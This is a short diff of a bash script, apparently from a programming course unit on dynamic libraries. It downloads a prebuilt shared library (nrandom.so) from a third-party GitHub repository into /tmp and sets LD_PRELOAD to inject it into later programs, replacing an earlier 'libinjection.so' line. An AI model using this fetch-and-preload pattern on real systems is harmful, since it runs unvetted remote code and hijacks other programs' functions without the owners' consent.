@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P .. https://github.com/melkemariyam/alx-low_level_programming/tree/master/0x18-dynamic_libraries/libinjection.so
-export LD_PRELOAD=/tmp/libinjection.so
+wget -P /tmp/ https://raw.github.com/luischaparroc/holbertonschool-low_level_programming/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
